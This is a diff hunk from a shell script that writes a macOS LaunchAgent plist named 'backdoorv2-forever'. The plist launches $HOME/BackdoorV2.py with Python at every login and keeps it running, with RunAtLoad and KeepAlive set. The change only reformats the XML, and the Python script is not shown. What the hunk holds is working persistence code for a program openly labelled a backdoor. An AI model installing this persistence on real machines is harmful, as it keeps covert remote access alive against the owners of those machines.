@@ -4,11 +4,19 @@ cat > ~/Library/LaunchAgents/backdoorv2-forever.plist <<EOF
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>Label</key><string>backdoorv2-forever</string>
-    <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$HOME/BackdoorV2.py</string></array>
-    <key>RunAtLoad</key><true/>
-    <key>KeepAlive</key><true/>
-    <key>WorkingDirectory</key><string>$HOME</string>
+    <key>Label</key>
+    <string>backdoorv2-forever</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>$HOME/BackdoorV2.py</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>WorkingDirectory</key>
+    <string>$HOME</string>
 </dict>
 </plist>
 EOF
